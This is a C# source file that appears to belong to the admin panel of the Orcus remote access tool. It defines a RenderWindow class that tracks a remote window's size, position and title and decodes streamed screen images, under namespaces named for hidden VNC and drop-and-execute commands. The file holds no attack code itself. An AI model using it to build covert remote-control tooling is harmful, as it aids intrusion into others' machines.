using System;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using System.Windows;
using System.Windows.Media.Imaging;
using Orcus.Shared.Commands.HVNC;
using Orcus.Shared.Utilities.Compression;

namespace Orcus.Administration.Commands.DropAndExecute
{
    public class RenderWindow : IDisposable, INotifyPropertyChanged
    {
        private int _codecHeight;
        private int _codecWidth;
        private int _height;
        private WriteableBitmap _image;
        private string _title;
        private UnsafeStreamCodec _unsafeStreamCodec;
        private int _width;
        private int _x;
        private int _y;

        public RenderWindow(WindowInformation windowInformation)
        {
            Handle = windowInformation.Handle;
            UpdateData(windowInformation);
        }

        public Int64 Handle { get; }
        public DateTime LastUpdateUtc { get; private set; }

        public WriteableBitmap Image
        {
            get { return _image; }
            set
            {
                if (_image != value)
                {
                    _image = value;
                    OnPropertyChanged();
                }
            }
        }

        public int Height
        {
            get { return _height; }
            set
            {
                if (_height != value)
                {
                    _height = value;
                    OnPropertyChanged();
                }
            }
        }

        public int Width
        {
            get { return _width; }
            set
            {
                if (_width != value)
                {
                    _width = value;
                    OnPropertyChanged();
                }
            }
        }

        public int X
        {
            get { return _x; }
            set
            {
                if (_x != value)
                {
                    _x = value;
                    OnPropertyChanged();
                }
            }
        }

        public int Y
        {
            get { return _y; }
            set
            {
                if (_y != value)
                {
                    _y = value;
                    OnPropertyChanged();
                }
            }
        }

        public string Title
        {
            get { return _title; }
            set
            {
                if (_title != value)
                {
                    _title = value;
                    OnPropertyChanged();
                }
            }
        }

        public void Dispose()
        {
        }

        public event PropertyChangedEventHandler PropertyChanged;

        public void UpdateData(WindowInformation windowInformation)
        {
            Height = windowInformation.Height;
            Width = windowInformation.Width;
            Title = windowInformation.Title;
            X = windowInformation.X;
            Y = windowInformation.Y;
        }

        public unsafe void UpdateImage(byte[] data, int index, uint length)
        {
            if (_unsafeStreamCodec == null || _codecHeight != _height || _codecWidth != _width)
            {
                _unsafeStreamCodec?.Dispose();
                _unsafeStreamCodec = new UnsafeStreamCodec(UnsafeStreamCodecParameters.None);
                _codecHeight = _height;
                _codecWidth = _width;
            }

            fixed (byte* dataPtr = data)
                Image = _unsafeStreamCodec.DecodeData(dataPtr + index, length, Application.Current.Dispatcher);

            LastUpdateUtc = DateTime.UtcNow;
        }

        protected virtual void OnPropertyChanged([CallerMemberName] string propertyName = null)
        {
            PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
        }
    }
}